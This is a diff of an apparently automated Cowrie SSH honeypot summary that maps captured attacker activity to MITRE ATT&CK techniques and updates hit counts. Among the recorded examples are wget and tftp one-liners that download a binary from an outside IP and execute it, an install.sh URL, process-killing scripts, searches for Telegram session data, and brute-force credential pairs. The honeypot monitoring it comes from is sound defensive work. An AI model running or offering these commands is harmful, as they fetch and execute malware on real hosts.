@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-18 13:01:11",
+  "generated": "2026-09-18 14:00:45",
   "totals": {
-    "commands": 1524,
-    "login_failed": 1278,
-    "login_success": 474,
-    "sessions": 1461
+    "commands": 1701,
+    "login_failed": 1355,
+    "login_success": 518,
+    "sessions": 1557
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1278,
+      "count": 1355,
       "examples": [
         "admin / user",
         "root / 123456",
@@ -21,14 +21,14 @@
         "admin / fuckfest"
       ],
       "first": "2026-09-18T00:03:59.596268Z",
-      "last": "2026-09-18T13:01:00.862386Z",
-      "unique_ips": 69
+      "last": "2026-09-18T14:00:36.156517Z",
+      "unique_ips": 73
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 474,
+      "count": 518,
       "examples": [
         "ubuntu / ubuntu",
         "adm / adm",
@@ -37,8 +37,8 @@
         "root / admin"
       ],
       "first": "2026-09-18T00:24:48.056231Z",
-      "last": "2026-09-18T13:01:01.466594Z",
-      "unique_ips": 42
+      "last": "2026-09-18T13:34:54.683308Z",
+      "unique_ips": 44
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 31,
+      "count": 45,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -69,8 +69,49 @@
         "https://del.sou.pp.ua/install.sh"
       ],
       "first": "2026-09-18T01:58:59.591466Z",
-      "last": "2026-09-18T12:31:42.154537Z",
-      "unique_ips": 8
+      "last": "2026-09-18T13:35:19.932823Z",
+      "unique_ips": 9
+    },
+    {
+      "id": "T1057",
+      "name": "Process Discovery",
+      "tactic": "Discovery",
+      "count": 24,
+      "examples": [
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'",
+        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
+      ],
+      "first": "2026-09-18T02:28:05.820841Z",
+      "last": "2026-09-18T13:35:05.860850Z",
+      "unique_ips": 4
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 23,
+      "examples": [
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
+      ],
+      "first": "2026-09-18T02:28:07.263120Z",
+      "last": "2026-09-18T13:35:05.860850Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 21,
+      "examples": [
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
+      ],
+      "first": "2026-09-18T05:49:14.882666Z",
+      "last": "2026-09-18T13:35:05.860850Z",
+      "unique_ips": 3
     },
     {
       "id": "T1082",
@@ -87,47 +128,6 @@
       "first": "2026-09-18T00:25:00.479830Z",
       "last": "2026-09-18T10:29:06.764260Z",
       "unique_ips": 14
-    },
-    {
-      "id": "T1057",
-      "name": "Process Discovery",
-      "tactic": "Discovery",
-      "count": 14,
-      "examples": [
-        "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'",
-        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
-      ],
-      "first": "2026-09-18T02:28:05.820841Z",
-      "last": "2026-09-18T08:17:42.264969Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 13,
-      "examples": [
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
-      ],
-      "first": "2026-09-18T02:28:07.263120Z",
-      "last": "2026-09-18T08:17:42.264969Z",
-      "unique_ips": 4
-    },
-    {
-      "id": "T1489",
-      "name": "Service Stop",
-      "tactic": "Impact",
-      "count": 11,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "#!/bin/sh\n\nfor pid in /proc/[0-9]*; do\n    [ \"$pid\" = \"/proc/1\" ] && continue\n    [ \"$pid\" = \"/proc/2\" ] && continue\n   "
-      ],
-      "first": "2026-09-18T05:49:14.882666Z",
-      "last": "2026-09-18T08:17:42.264969Z",
-      "unique_ips": 2
     },
     {
       "id": "T1033",
@@ -220,15 +220,15 @@
   "unmapped": [
     [
       "system",
-      419
+      462
     ],
     [
       "shell",
-      419
+      462
     ],
     [
       "sh",
-      419
+      462
     ],
     [
       "zalee",
@@ -243,31 +243,35 @@
       20
     ],
     [
+      "sh 0",
+      20
+    ],
+    [
+      "/bin/busybox",
+      16
+    ],
+    [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       16
     ],
     [
-      "/bin/busybox",
-      12
-    ],
-    [
-      "sh 0",
-      10
+      "enable",
+      7
     ],
     [
       "/bin/busybox UNSTABLE",
       7
     ],
     [
-      "enable",
-      6
-    ],
-    [
       "linuxshell",
-      4
+      5
     ],
     [
       "cd /proc && cat self/cmdline",
+      4
+    ],
+    [
+      "!v54!",
       4
     ],
     [
@@ -291,11 +295,7 @@
       2
     ],
     [
-      "!v54!",
-      2
-    ],
-    [
-      "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+      "ping; sh",
       2
     ]
   ]
